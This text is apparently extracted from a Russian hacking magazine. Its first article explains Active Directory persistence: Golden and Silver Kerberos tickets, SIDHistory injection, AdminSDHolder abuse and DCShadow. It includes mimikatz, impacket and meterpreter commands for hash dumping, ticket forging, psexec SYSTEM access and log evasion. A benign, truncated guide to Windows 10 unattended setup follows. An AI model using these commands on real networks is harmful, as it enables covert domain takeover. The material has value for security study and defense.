KERBEROS GOLDEN TICKETS
Один из способов сох ранить доступ к системе — сформировать Golden Tick‐
et: пароль учетной записи krbtgt не будет изменен при тех же условиях,
при которых может быть изменен пароль админис тра тора.
   Golden  Ticket — это поддельные билеты для выдачи билетов, также
называемые аутентификационными билетами (они же TGT). Если посмотреть
на схему аутентификации Kerberos в случае Golden Ticket, то можно заметить,
что подлинность Kerberos не про веря ется (AS‐REQ и AS‐REP с контроллером
домена). Так как Golden Ticket является поддель ным TGT, он отправляется
контроллеру домена как часть TGS‐REQ для получения билета TGS.





            Схема аутентификации Kerberos c Golden Ticket

Золотой билет Kerberos — действительный билет Kerberos TGT, поскольку он
зашифрован и подписан доменной учетной записью Kerberos (krbtgt). А так
как TGT зашифрован хешем пароля krbtgt и может быть рас шифрован
любой службой KDC в домене, то билет и воспринимается как реальный.
Для того чтобы сделать Golden Ticket, нам необ ходимо знать следующее:
 1. SPN домена.
 2. SID домена.
 3. NTLM‐хеш доменной учетной записи krbtgt.
 4. Имя пользователя, под которым будет работать оператор (даже если
   такого пользователя не существует).

Так как имя пользователя может быть любым, оста ется найти три недос‐
тающих компонента. Название и SID домена можно узнать с помощью Power‐
Shell‐команды Get‐ADDomain.





                           SID и имя домена

Теперь нужно получить NTLM‐хеш учетной записи krbtgt. Сделать это можно
как удаленно, так и с помощью mimikatz. С использованием mimikatz у опе‐
ратора есть выбор: выполнить ата ку DCSync, используя базу Security Account
Managers (SAM), или задействовать модуль sekurlsa.


mimikatz # lsadump::dcsync /user:krbtgt





      Получаем хеши с помощью mimikatz, используя атаку DCSync


mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt





        Получаем хеши с помощью mimikatz, используя базу SAM


mimikatz # sekurlsa::krbtgt





     Получаем хеши с помощью mimikatz, используя модуль sekurlsa

Удаленная атака выполняется также с использованием DCSync или при
наличии открытой сессии meterpreter.


impacket‐secretsdump domain.dom/root@192.168.6.100





             Получение хешей с помощью secretsdump

Существует два варианта использования meterpreter: при помощи hash‐
dump и dcsync_ntlm (для второго нужно загрузить модуль kiwi).





          Получение хешей с помощью meterpreter hashdump





         Получение хешей с помощью meterpreter dcsync_ntlm

С помощью полученной информации можно соз дать и при менить Golden
Ticket. Сделаем  это  тремя  способами:  исполь зуя  mimikatz,  удаленно
с помощью ticketer и с исполь зованием meterpreter.


Ticketer
Первым делом следует соз дать билет. Для этого используем скрипт tick‐
eter из пакета impacket (напомню, что имя пользователя можно выдумать
любое).


impacket‐ticketer ‐nthash 08f5bf2e292d77d8e460d3926a0d90de
‐domain‐sid S‐1‐5‐21‐719111203‐942671344‐1831409528 ‐domain domain.
dom anyuser





              Создание Golden Ticket с помощью ticketer

В текущей директории создан билет anyuser.ccache. Экспортируем его.


export KRB5CCNAME=anyuser.ccache

Теперь подклю чимся с помощью psexec из того же пакета impacket.


python3 psexec.py ‐k ‐no‐pass [домен]/[пользователь]@[имя хоста]





            Подклю чаемся к хос ту, используя Golden Ticket

Получаем удаленное управление с правами SYSTEM.


Mimikatz
Создадим поддельный золотой билет с помощью mimikatz.





             Создание Golden Ticket с помощью mimikatz

Если в данной команде не использовать параметр /ptt, то билет будет прос‐
то сохранен в текущей директории. В данном слу чае он сразу будет кеширо‐
ван в памяти. Давай проверим это, вызвав командную строку.


mimikatz # misc::cmd

Теперь, выполнив команду klist, наблюда ем кешированный Golden Ticket.





             Создание Golden Ticket с помощью mimikatz


Meterpreter
Для работы с meterpreter будем исполь зовать модуль kiwi. Первым делом
создадим Golden Ticket.



            Создание Golden Ticket с помощью meterpreter

Теперь применим его.



           Применение Golden Ticket с помощью meterpreter

И проверим, что билет успешно загружен.





                      Заг руженный Golden Ticket

Таким образом, у нас оста ется воз можность работы с повышенными при‐
вилегиями, при этом мы не используем учетных данных адми нистраторов.
Это означает, что мы можем получить дос туп всег да, даже при смене паролей
пользователей, изменении их ролей и даже при удалении скомпромети‐
рованных учетных записей.


KERBEROS SILVER TICKET
Silver Ticket — это поддельные билеты TGS, также называемые билетами
службы. Как показано на схеме аутентификации Kerberos с Silver Ticket, в этом
случае отсутствуют шаги AS‐REQ/AS‐REP и TGS‐REQ/TGS‐REP, что исключает
взаимодействие с контроллером домена. То есть у нас получается избежать
логирования, так как журналы событий рас полагаются на сервере.





             Схема аутентификации Kerberos c Silver Ticket

Серебряный билет Kerberos — действительный билет Kerberos TGS: он
зашифрован и подписан учетной записью служ бы, для которой нас троено
SPN‐имя для каждого сервера, на котором, в свою очередь, работает служба
проверки подлинности Kerberos.
  В то вре мя как Golden Ticket является поддельным TGT для получе ния дос‐
тупа к любой службе Kerberos, Silver Ticket представляет собой поддельный
TGS. А это означает, что область его примени мос ти ограничена определен‐
ной службой.
  Из всего вышесказанного следует, что вмес то хеша пароля учетной
записи krbtgt нужен хеш пароля учетной записи службы, а также ее SPN‐
имя. Ниже представлены наиболее интересные службы и соответству ющие
им типы билетов.


 Служ ба                                  Тип Silver Ticket

 WMI                                           HOST, RPCSS

  PowerShell Remoting                              HOST, HTTP

 WinRM                                         HOST, HTTP

 Запланированные задачи                     HOST

 Общий доступ к файлам Windows (CIFS)              CIFS

 LDAP                                      LDAP

 Средства удаленного администрирова ния Windows   RPCSS, LDAP, CIFS

Разберем создание Silver Ticket на примере службы cifs. Она позволит нам
обращаться с правами администратора к любому обще му ресурсу на компь‐
ютере, чего хватит для работы через psexec с правами SYSTEM.
  Для службы cifs нам достаточно хеша пароля учетной записи компьюте‐
ра. Его можно получить так же, как и в случае с Golden Ticket.





             Получение хешей с помощью secretsdump





             Получение хешей с помощью meterpreter

В случае с mimikatz мож но использовать sekurlsa::logonpasswords.





     Получение хеша учетной записи компь юте ра с помощью mimikatz

Теперь давай создадим и применим Silver Ticket.


Ticketer
Для начала сгенерируем  Silver  Ticket. Сделать это можно по аналогии
с золотым билетом, но следует указать SPN службы CIFS.


impacket‐ticketer ‐nthash c854d3f11ea2ad22267ed4571f77d29b
‐domain‐sid S‐1‐5‐21‐719111203‐942671344‐1831409528 ‐domain domain.
dom ‐spn cifs/[hostname] anyuser





     Получение хеша учетной записи компь юте ра с помощью mimikatz

Теперь экспортируем тикет.


export KRB5CCNAME=anyuser.ccache

И наконец, получим управление с правами SYSTEM с помощью psexec.





     Получение хеша учетной записи компь юте ра с помощью mimikatz


Mimikatz
NTLM‐хеш пароля учетной записи компьютера используется с параметром
rc4. При этом мы можем придумать как имя пользователя, так и его User ID (в
параметре id). В парамет ре service ука жем cifs, а в target — полное имя
компьютера.


kerberos::golden /admin:anyuser /domain:domain.dom /id:1111 /sid:
S‐1‐5‐21‐719111203‐942671344‐1831409528 /target:[hostname] /rc4:[
NTLM хеш] /service:cifs /ptt





     Получение хеша учетной записи компь юте ра с помощью mimikatz

Проверим загруженные в память билеты и обнаружим там только что соз‐
данный.





     Получение хеша учетной записи компь юте ра с помощью mimikatz

Существует мне ние, что Silver Ticket куда более опасны, чем Golden Ticket,
несмотря на то что область их действия ограниченна. Это справедливо
потому, что хеш службы легче получить, чем хеш krbtgt, а обнаружение
такого вторжения сложнее из‐за отсутс твия взаимодействия с контроллером
домена.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     ЗАКРЕПЛЯЕМСЯ
  В ACTIVE DIRECTORY
                           КАК СОХРАНИТЬ ДОСТУП
                          ПРИ АТАКЕ НА ДОМЕН





SIDHISTORY
SIDHistory — это атрибут объекта в Active Directory, который хранит старый
SID. Наиболее часто он применяется при миг раци ях. Эта функция необ‐
ходима при переносе учетных записей пользователей из одного доверенного
домена в другой. При этом учетные записи полностью сохраняют настройки
доступа к старым ресурсам и файлам. Когда пользователь проходит проверку
подлинности, идентификаторы безопасности каж дой группы безопасности,
членом которой он является, добавляются в билет Kerberos этого пользовате‐
ля, а также в атрибут SIDHistory его учет ной записи.
  При создании нового пользователя SID его учет ки будет отличен от SID
других учетных записей. Это также спра ведливо при переносе пользователя
из первого домена во второй. В таком случае SID учет ной записи пользовате‐
ля из первого домена будет добавлен в SIDHistory учетной записи во вто‐
ром домене. Именно поэто му пользователь из второго домена может
получить доступ к своим старым ресурсам и фай лам в первом домене.
   Но, что удивительно, если обычный пользователь во втором домене имеет
в атрибуте SIDHistory сво ей учетной записи SID учетной записи одного
из администраторов первого домена, то данный пользователь становится
привилегированным в первом домене! То есть пользователю будут предос‐
тавлены права админис тра тора домена без его участия в группе «Админис‐
траторы домена».
   Таким образом, для сохранения привилегиро ванного дос тупа в доверен‐
ном домене опе ратор может вклю чить SID привиле гированной учетной
записи в целевом домене в атрибут SIDHistory контролируемой им неп‐
ривилегированной учетной записи из доверенного домена.
  С помощью mimikatz мы можем внед рить любой SID в атрибут SIDHistory
любого пользователя (но для этого нужны права администратора, которые
у нас, конечно же, есть). На следующей иллюстрации видно, что пользователь
notroot не имеет администра тивного дос тупа.





  Неудачное подключение с помощью psexec от имени пользователя
  notroot

Давай посмотрим атрибут SIDHistory этого пользовате ля.


PS > Get‐ADUser [пользователь] ‐Properties SIDHistory





                       SIDHistory поль зователя notroot

Данный атрибут у пользователя пуст. Теперь узнаем SID администратора,
который необходимо туда внедрить.





    Получение информации о пользователе с высокими привиле гиями

Давай внедрим с помощью mimikatz SID привилегированного пользовате ля
root в атрибут SIDHistory обычного пользователя notroot.


mimikatz # privilege::debug
mimikatz # sid::patch
mimikatz # sid::add /sam:[целевой пользователь] /new:[SID или
пользователь, чей SID внедряется]





                Внедрение в SID с помощью mimikatz

Все прошло успешно. Теперь сно ва про верим атрибут SIDHistory нашего
пользователя. Как видно на следующей иллюстрации, в атрибуте SIDHistory
теперь присутствует SID привилегиро ванного поль зовате ля.





                       SIDHistory поль зователя notroot

При входе в систему от имени пользователя notroot все идентификаторы
безопасности, связанные с этой учет ной записью, добавляются в токен поль‐
зователя, который задействован для определения доступа к ресурсам. Если
точнее, туда добавляются:
 1. SID, связанный с учетной записью пользователя.
 2. SID’ы групп, в которые входит пользователь (включая группы, чле нами
   которых являются эти группы).
 3. SID’ы, содержащиеся в SIDHistory.

Если снова попытаться войти в систему от имени пользователя notroot, то
можно заметить, что теперь он имеет административный дос туп.





  Успешное подключение от имени пользователя notroot с помощью
  psexec

Когда пользователь notroot вхо дит в систему, SID’ы, связанные с его учет‐
ной записью, оцениваются и доступ определяется на основе этих SID. Так
как учетная запись notroot свя зана с учетной записью root (админис тра‐
тор), учетная запись notroot имеет все права дос тупа к учетной записи root,
вклю чая права администратора домена.


GOLDEN TICKET + SIDHISTORY
Родительский (корневой) домен содержит группу админис траторов всего
леса Enterprise Admins. Поэто му, ког да хеш пароля учетной записи krbtgt
предоставляется в дочернем домене, сущес твует определенное ограниче‐
ние. Так как mimikatz добавляет членс тво в группе за счет относительных
идентификаторов (RID), то в данном случае в билете Kerberos группа RID 519
(Enterprise Admins) будет идентифицирована как локальная по отношению
к домену, в котором был соз дан билет (на основе домена учетной записи
krbtgt). Но если идентификатор безопасности, полученный путем добав‐
ления RID к SID’у домена, не существует, то вла делец билета Kerberos
не получит определен ный уровень дос тупа.
   Таким образом, если домен, в котором был соз дан Golden  Ticket,
не содержит группу Enterprise Admins, то данный билет не предос тавит права
администратора для других доменов в том же лесу. Если сделать Golden Tick‐
et с помощью mimikatz и обратиться к ресурсам в своем и другом доменах, то
во втором случае мы получим отказ в дос тупе.


mimikatz # kerberos::golden /admin:anyuser /domain:domA.domain.dom /
sid:S‐1‐5‐21‐719111203‐942671344‐1831409528‐1000 /krbtgt:08f5bf
2e292d77d8e460d3926a0d90de /ptt





             Обычный Golden Ticket с помощью mimikatz

Мы уже подробно разоб рали, как работа ет SIDHistory, и знаем, что билет
Kerberos содержит этот параметр. Давай добавим в золотой билет Kerberos,
а именно в параметр SIDHistory SID группы Enterprise Admins.


mimikatz # kerberos::golden /admin:anyuser /domain:domA.domain.dom /
sid:S‐1‐5‐21‐719111203‐942671344‐1831409528‐1000 /krbtgt:08f5bf
2e292d77d8e460d3926a0d90de /sids:[SID группы Enterprise Admins] /ptt





              Golden Ticket с SIDHistory с помощью mimikatz

Таким образом мы получаем доступ ко всему лесу.


ADMINSDHOLDER
AdminSDHolder — это объект, расположенный в разделе System в Active Di‐
rectory (cn=adminsdholder, cn=system, dc=domain, dc=dom). Он используется
в качестве шаблона безопасности для объектов, которые являются чле нами
определенных привилегированных групп, называемых защищенными груп‐
пами.





                    Объект AdminSDHolder

В Active Directory учетные записи и груп пы с высоким уровнем привилегий
по умолчанию считают ся защищенными. При использовании большинства
объектов в Active Directory администраторы или поль зовате ли, которым были
делегированы разрешения на управление объектами Active Directory, могут
не только изменять права дос тупа к объектам, но и управлять самими раз‐
решениями (к примеру, что бы настра ивать членс тво в группах).
  Но есть одна особен ность: в случае защищенных учетных записей и групп
разрешения  объектов  уста навлива ются  и  применяются  автоматически.
Это гарантирует, что разрешения на объекты оста нутся еди нообразными,
даже если объекты будут перемещены в дру гой каталог. Таким образом, если
кто‐либо вручную изменяет раз решения защищенного объ екта, эти раз‐
решения будут возвращены к их значени ям по умолчанию.
  Объекты, которые по умолчанию считаются защищенными группами, —
это операторы учета, администратор, адми нистра торы, операторы архива,
администраторы домена, администра торы предпри ятия, администраторы
корпоративных клю чей, администра торы ключей, KRBTGT, операторы печати,
контроллеры домена только для чтения, репликатор, администраторы схемы,
операторы сервера. В отличие от большинс тва объектов в домене Active Di‐
rectory, владельцем которых являются группы «Администраторы», объ ект Ad‐
minSDHolder принадлежит группе «Администраторы домена». Таким обра‐
зом, все защищенные с помощью AdminSDHolder объекты имеют атрибут
AdminCount, установленный в 1. Но если объект удалить из защищенной
группы, значение атрибута AdminCount не изменится.
   Так как глав ным усло вием защищаемого объ екта становится значение
атрибута AdminCount, равное 1, мы можем найти все эти объ екты с помощью
следующего скрипта.


$ldapFilter = "(adminCount=1)"
$domain = New‐Object System.DirectoryServices.DirectoryEntry
$search = New‐Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"


$result = $search.FindAll()


foreach ($res in $result){
    $userEntry = $res.GetDirectoryEntry()
    Write‐host "Object Name = " $userEntry.name
    Write‐host "Object Class = " $userEntry.objectClass
    foreach($AdminCount in $userEntry.adminCount){
        Write‐host "AdminCount = " $AdminCount
        Write‐host ""
    }
}

Список  контро ля  доступа  (ACL)  объекта  AdminSDHolder  применяется
как шаблон для всех раз решений всем защищенным объектам Active Directory
и их членам. Для обеспечения безопас ного доступа к защищенным объектам
Active Directory будет брать ACL объекта AdminSDHolder и периодичес ки при‐
менять его ко всем этим объектам, то есть ко всем пользователям и группам.
Таким образом, если мы можем манипулировать списком ACL для AdminSD‐
Holder, эти разрешения будут автоматичес ки при менены ко всем защищен‐
ным объектам, что позволит создать постоянный доступ к привилегирован‐
ным учетным записям в домене.
  За автоматизацию вос становления раз решений защищенных объ ектов
отвечает процесс SDProp. По умолчанию восстановление происходит каж‐
дые 60 минут (но этот интервал мож но изменить). Таким образом, если адми‐
нистратор увидит подоз ритель ное раз решение для защищенного объ екта
и удалит его, то спустя ука занное время эти полномочия будут восстановлены
обратно благодаря SDProp, так как атрибут AdminCount данного объ екта дол‐
жен быть рав ным 1. В результате объект оста нется защищенным.
  Давай добавим поль зователя к AdminSDHolder или выставим пользовате‐
лю атрибут adminCount в 1.


Get‐ADUser [пользователь] | Set‐ADObject ‐Clear adminCount
Get‐ADUser [пользователь] | Set‐ADObject ‐Add @{adminCount=1}

Спустя некоторое время после восстановления разрешений SDProp’ом дан‐
ная учетная запись будет иметь полный контроль над группой «Администра‐
торы домена».
  При этом можно заметить, что пользователь не имеет членства в группах.


Get‐ADUser [пользователь] ‐Properties memberof





               Ин формация о целевом пользователе

Чтобы изменить интервал восста новления, нужно в ветке реестра HKEY_LO‐
CAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
создать параметр DWORD с именем AdminSDProtectFrequency, а в качестве
значения указать количество секунд (минимальное — 60).
   AdminSDHolder — это очень хитрый метод, поз воляющий нам пре дос‐
тавлять возможность менять привилегиро ванные группы в Active Directory,
используя ключевой компонент безопас ности. Таким образом, даже если
разрешения для защищен ной группы или поль зователя изменены админис‐
тратором, SDProp вернет разрешения безопас ности спустя отведенный
интервал времени в соответствии с объектом AdminSDHolder, тем самым
возвращая нам административный доступ.


DCSHADOW
В предыдущей части статьи мы рассмотрели спо соб обес печить персистен‐
тность доступа, основанный на изменении раз решений защищаемых объ‐
ектов, то есть на управлении списками ACL и манипуляциях с контейнером
AdminSDHolder. Но эти способы могут быть зарегистрированы в журнале
событий. Чтобы избежать этого, есть решение: DCShadow позволя ет вносить
такие изменения без регистра ции событий, что снижает риск обнаружения.
   Таким образом, план следующий:
 1. Получить текущие раз решения AdminSDHolder.
 2. Внести изменения в разрешения (добавить нового пользовате ля).
 3. Применить обновленные раз решения через DCShadow.

Получить текущие разрешения можно с помощью PowerShell.


$asdh = [adsi]'LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=dom'
$sddl = $asdh.ObjectSecurity.Sddl





     Текущие разрешения контейнера AdminSDHolder в формате SDDL

Чтобы обеспечить персистентность дос тупа, добавим учетную запись в раз‐
решения AdminSDHolder. Для это го нужно изменить полученную строку
SDDL. Сначала необходимо узнать SID целево го объекта.





              Получение SID целевого пользовате ля

Теперь можно изменить SDDL, просто добавив туда SID.


$newsddl = $sddl + "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;[SID]])"





                     Новая строка SDDL

Приступим к последнему этапу — использованию DCShadow. Чтобы при‐
менить данные разрешения, используем mimikatz, причем от име ни System.


mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:"CN=AdminSDHolder,CN=System,
DC=domain,DC=dom" /attribute:ntsecuritydescriptor /value:[SDDL]




  Изменение разрешений AdminSDHolder с помощью mimikatz DCShadow

При этом в другом окне mimikatz нужно выполнить репликацию и применить
данные.


mimikatz # lsadump::dcshadow /push

Спустя  некоторое  время  у  целевой  учетной  записи можно  заметить
обновленный атрибут adminCount, о котором мы уже говорили.




  Изменение разрешений AdminSDHolder с помощью mimikatz DCShadow

Таким образом еще один вектор, для которо го мы можем использовать DC‐
Shadow, — персистентность административного доступа.
  Для тех, кто хочет получить больше информа ции по этой теме, я создал
телеграм‐канал @RalfHackerChannel, где можно задать свои вопросы (или
ответить на вопросы других юзеров). До встречи в следующих статьях!
ТРЮКИ
     WINDOWS
          SETUP
     AUTOMATION

                   УЧИМ WINDOWS 10
            СТАВИТЬСЯ НА АВТОПИЛОТЕ
           И НЕ ЗАДАВАТЬ ВОПРОСОВ





Если ты думаешь, что уста новка Windows
10 — крайне простой и тривиальный про‐
цесс, то ты ошибаешься. Потому что он
может стать еще проще и тривиальнее,
если приложить к это му немного усилий.       Валентин Холмогоров                                                                                               valentin@holmogorov.ru
Существует способ  уста новить  систему,
не   отвлекаясь   на   вопросы   прог‐
раммы‐инсталлятора:  это  очень удобно,
а при обслуживании парка машин — поп‐
росту  необходимо.  Давай  разберемся,
как работает этот механизм.


Режим автоматической установки ОС, или Windows Setup Automation (WSA),
хорошо известен пользователям еще со времен Windows XP. Правда, с тех
пор он претерпел ряд существенных изменений. С использованием WSA
можно запустить процедуру инсталляции и спокойно уйти по своим делам
на часик‐другой, а вернувшись, обна ружить, что сис тема уже работает
на компьютере. Магия! К счастью, никаких сложных заклинаний для этого
не потребуется. Основные методы авто мати зации установки, а также некото‐
рые связанные с нею хитрости мы и рассмотрим в сегодняшней статье.


ТОЛЬКО БЕЗ РУК!
Если ты желаешь запустить установку Windows и идти пить кофе, избавившись
от необходимости сидеть в ближайшие сорок минут перед монитором, такая
возможность есть. Причем эта возможность существу ет уже давно: механиз‐
мы автоматизиро ванного раз вертывания ОС с прицелом на корпоративный
рынок, где сисадминам приходится обслуживать парк из десятков и сотен
компьютеров, в Microsoft придумали уже более двадцати лет назад.
  Во времена Windows XP все было проще. Доллар стоил 28 рублей, пиво —
меньше доллара, а для автоматизиро ванной установки винды требовалось
всего лишь создать специальный тексто вый файл unattend.txt и положить
его в корень дистрибутива. Сейчас все кардиналь но изме нилось: похоже,
в Microsoft решили максимально заморочить поль зователей с тем, чтобы они
бросили заниматься подобными глу пос тями. Но мы люди настырные и потому
постараемся разоб раться, что там напридумывали эти ребята из Редмонда
и как с этим следует бороться.
   Начнем с того, что теперь для файла с ответами используется не прос той
текстовый формат, как в ста рые доб рые времена, а XML. И если раньше такой
файл можно было создать с помощью утилиты, которая входила в сос тав дис‐
трибутива Windows, то сейчас для это го потребу ется отдельная тул за. Но и
это еще не все.
  В опре деленный исторический момент Microsoft начала упаковывать фай‐
лы дистрибутива Windows в специальный сжатый образ формата Windows
Imaging Format (WIM). Где‐то на этапе появления Windows 7 в Ред монде
решили: а почему бы не пос тавлять в одном дистрибути ве сразу несколько
версий опе рационной системы, например «Домашнюю», «Домашнюю рас‐
ширенную» и «Профессиональную», или релизы раз ной разрядности —
x86 и x64? Сказано — сделано: нес колько образов WIM с раз личными вер‐
сиями винды стали паковать в один фай ловый архив install.esd, который
поддерживает еще боль шую степень сжа тия. В Windows 10 от WIM окон‐
чательно отказались в пользу ESD, поскольку этот формат позволя ет сжимать
файлы сильнее и тем самым экономить боль ше дискового пространс тва.
Проблема в том, что саму винду и инс трументы для ее развертывания,
видимо, писали в разных отделах корпорации: утилиты от Microsoft не умеют
работать с форматом ESD, им нужен старый доб рый WIM. Поэтому алгоритм
подготовки дистрибутива к автоматической уста новке в общем виде выглядит
следующим образом:
 1. Скачивание дистрибутива Windows 10.
 2. Извлечение из него файла ESD и преобразование его в WIM.
 3. Установка утилиты для настройки авто матичес кой инстал ляции.
 4. Создание файла с ответами.
 5. Подготовка дистрибутива к установке системы.

Еще не слишком страшно? Тогда разберем каждый пункт по порядку.


СКАЧИВАЕМ ДИСТРИБУТИВ
Для того чтобы приготовить яичницу, нужны как минимум яйца, а чтобы нас‐
троить автоматическую установку системы, нам понадобится дис трибутив
Windows 10. Если у тебя его нет, дистрибутив можно легально скачать с сайта
Microsoft (правда, потом к нему придется прикупить серийник).
  Для загрузки образа Windows 10 используется следующая хитрая про‐
цедура. Открой в браузере страничку Download Windows 10, скачай оттуда
тул зу под названием «Средс тво создания носителя Windows 10» и запус ти
его. В появившемся окне нужно принять условия лицензионного соглашения,
а затем установить переключатель в положение «Создать установочный
носитель (USB‐устрой ство флеш‐памяти, DVD‐диск или ISO‐файл)», и нажать
«Далее».





     Правильный выбор версии Windows для загрузки — залог успеха

Теперь следует выбрать язык системы и ее раз рядность. Выбирать нужно
осторожно — указанная тобой версия вин ды должна подходить к тому серий‐
ному номеру, который у тебя имеется (или который ты планиру ешь при‐
обрести). Нажав «Далее», устанавлива ем переключатель в положе ние «ISO‐
файл» (или «Загрузоч ный USB», что, в общем, без разницы: в этом случае
к компьютеру нужно присоединить флешку объ емом не менее 8 Гбайт, вся
информация с которой будет стерта). Сно ва жмем «Далее», показы ваем, куда
нужно сохранить образ диска, и дожида емся окончания загрузки дистрибути‐
ва.


ИЗВЛЕКАЕМ WIM
Как я уже упоминал, для работы с образом Windows необходимо исполь‐
зовать файлы в формате WIM, в то время как современные дистрибутивы хра‐
нят образы ОС в архиве с высокой степенью сжатия install.esd, который
лежит в папке sources. Если в дистрибутиве содержатся версии Windows
для разных архитектур, эта пап ка будет вложена в папку x86 или x64. В Win‐
dows за работу с обра зами WIM и ESD отвечает консольная утилита dism,
которой можно воспользовать ся из командной строки. Полный список
параметров утилиты выводит ся на экран по команде dism /?.
  Перейди в папку, в которую ты сохранил ISO‐образ Windows 10. Если ты
используешь утилиты вроде DaemonTools, можно смонтировать этот образ
на виртуальный диск, но для наших целей достаточно установить бес платный
архиватор 7‐Zip и открыть ISO‐файл в нем как обычный архив. Если ты
записал образ на флешку, можно просто прос мотреть ее содержимое в про‐
воднике.  Скопируй  все  папки  и  фай лы  из  дистрибутива  Windows
в какую‐нибудь директорию на локальном диске, например DVD.
  Поскольку в файле install.esd может хра нить ся сразу несколько обра‐
зов Windows, для начала мы должны узнать, какие версии сис темы там содер‐
жатся. Для этого нужно вспомнить, как обращаться с командной строкой.
  Запусти от имени администратора командную строку или PowerShell
и набери там сле дующую строчку:


dism /Get‐WimInfo /WimFile:[path]\install.esd

где [path] — полный путь к папке с фай лом install.esd, например D:\DVD\
sources. В ответ утилита dism выдаст информа цию обо всех версиях Win‐
dows в архиве.





  Утилита dism показывает все образы Windows, хра нящиеся в ESD‐архиве

Выбери ту версию Windows, с которой будешь дальше работать, то есть вер‐
сию, для которой у тебя есть серийный номер. Теперь набери в командной
строке или PowerShell следующую команду:


dism /Export‐Image /SourceImageFile:[path1]install.esd /SourceIndex:[
number] /DestinationImageFile:[path2]install.wim /Compress:Max /
CheckIntegrity

где [path1] — пол ный путь к папке с фай лом install.esd, например D:\
DVD\sources; [number] — номер версии Windows, образ которой мы будем
извлекать; [path2] — пол ный путь, по которому будет сохранен извле ченный
образ. В моем случае команда выглядит так:


dism /Export‐Image /SourceImageFile:D:\DVD\sources\install.esd /
SourceIndex:1 /DestinationImageFile:D:\DVD\sources\install.wim /
Compress:Max /CheckIntegrity

Теперь дождись, пока утилита вытащит выб ранный тобой образ из ESD‐фай‐
ла и экспортирует его в WIM. Это займет некоторое время. Утилитка забот‐
ливо положит сконвертированный образ install.wim в указанную тобой
папку.





      Извлечение WIM‐обра за из ESD‐архива — про цесс небыстрый


             INFO

                    Приготовься к тому, что описываемые в статье
                         утилиты будут периодически крашиться, вылетать
                      при обращении к памяти или падать с непонят‐
                    ными номерными ошибками, не имеющими адек‐
                       ватной расшифровки. Для современного ПО от
                           Microsoft это совершенно нормальное поведение.



СТАВИМ ADK
Файл с ответами программы уста новки можно соз дать с помощью специаль‐
ной утилиты, которая называется Windows System Image Manager (Windows
SIM). Эта тулза входит в состав Windows Assessment and Deployment Kit (Win‐
dows ADK), который доступен для заг рузки на сайте Microsoft.
   Скачав ADK, запусти adksetup.exe и укажи, в какую папку устанавливать
пакет. Затем установщик поинтересу ется, хочешь ли ты отправлять в Microsoft
данные со своего компьютера о том, как ты используешь их программы: дело
хозяйское, но лично я выб рал вариант «Нет».





     Microsoft интересуется твоими ано нимными данными, %username%

Далее нужно принять усло вия лицензионного сог лашения и выбрать под‐
лежащие установке компоненты: самое прос тое — установить все флажки,
хотя нас интересуют только пункты «Средс тва развертывания» и «Среда пре‐
дустановки Windows PE». Затем жмем кнопку «Установить» и отдыхаем, пока
инсталлятор не скопиру ет на диск все необ ходимые файлы (по всей видимос‐
ти, он их откуда‐то качает, судя по скорости этого про цесса — с Марса).





          Выбор компонентов Windows ADK для установки

После того как все скачалось и установилось, запусти Windows SIM от имени
администратора, отыскав соответству ющий зна чок в главном меню.


СОЗДАЕМ ФАЙЛ ОТВЕТОВ
Открой меню «Файл», пункт «Выбрать образ Windows», и укажи программе
место расположения файла install.wim. Скорее всего, программа руг‐
нется, что невозможно загрузить файл каталога, — согласись с предложени‐
ем создать новый файл. В результате этого дей ствия будет сгенерирован
файл .clg, который программа помес тит в ту же папку, что и install.wim.
В этом файле содержатся параметры состояния компонентов Windows,
используемые в процессе уста новки.
   Если появится соот ветс твующий спи сок, выбери в открывшемся списке
редакцию Windows, которую мы будем нас тра ивать. Теперь нужно дождаться,
когда образ полностью заг рузится в приложение.





  Загрузка образа занимает много времени и час то завершается с ошиб‐
  ками

Щелкни мышью на кнопке «Новый файл ответов» в левом верхнем углу окна
программы. В поле «Файл ответов» появится древовидная структура будуще‐
го XML‐файла. Нас интересу ет раздел Components, насчитывающий семь
секций.





                   Структура разделов фай ла ответов

В общем случае порядок действий таков:
 • в секции «Образ Windows» разверни выпада ющий список Components,
   затем разверни интересу ющий тебя дочерний компонент, щел кни на нем
   правой клавишей мыши и выбери в контекс тном меню пункт «Добавление
   параметра для [название раздела]»;
 • выбранная тобой группа настро ек будет добавлена в оснас тку, рас‐
   положенную справа от поля «Файл ответов» в колонке «Свойства»;
 • щелкая мышью на соот ветствующих полях, можно менять представленные
   там значения.





               Создание парамет ров в фай ле ответов

Приложение позволя ет сконфигурировать под сотню раз ных нас троек прог‐
раммы уста новки, но все они, в общем‐то, не нужны. Для того чтобы инстал‐
лятор требовал от тебя минимум участия в процессе разверты вания системы,
необходимо изменить только секции «1 windowsPE», «4 specialize», и «7
oobeSystem». Так, в раз деле «1 windowsPE» можно задать дисковый раздел
и папку для установки Windows, выбрать язык, раскладку клавиату ры и указать
ключ продукта.


           WARNING

                     Настройки этого раздела несколько отличаются
                       для устройств, использующих BIOS и UEFI, осо‐
                      бенно если ты планируешь создавать новые дис‐
                      ковые разделы. Чтобы не ошибиться в разметке,
                       ознакомься с докумен тацией Microsoft для компь‐
                     юте ров с BIOS и для компьютеров с UEFI.


В секции «4 specialize» можно ука зать модель твоего устройства, его изго‐
товителя, имя компьютера, владельца устройства, текущую временную зону.
Наконец, в разделе «7 oobeSystem» ты можешь заранее согласиться с усло‐
виями  лицензионного  соглашения,  выб рать  дополнительные  языковые
параметры и настроить учетную запись пользователя сис темы. Поэкспе‐
риментировав с параметрами, ты сконфигури руешь программу установки так,
как нужно именно тебе.
  После того как все необ ходимые данные введены, нужно удалить разделы,
в которые не вносил никаких изменений. Для это го щел кни на таком разделе
в окне «Файл ответов» правой клавишей мыши и выбери в контекстном меню
пункт «Удалить».
   Теперь надо проверить, нет ли в файле ответов оши бок. Для этого выбери
в меню «Сервис» пункт «Проверка файла ответов» или нажми на одноимен‐
ную кнопку в панели инс трументов. Если программа не нашла ошибок, зна‐
чит, все хорошо. Теперь нажми на кноп ку «Сохранить файл отве тов» и введи
для него имя autounattend.xml.
   Если честно, разоб рать ся в интерфейсе Windows SIM и структуре данных
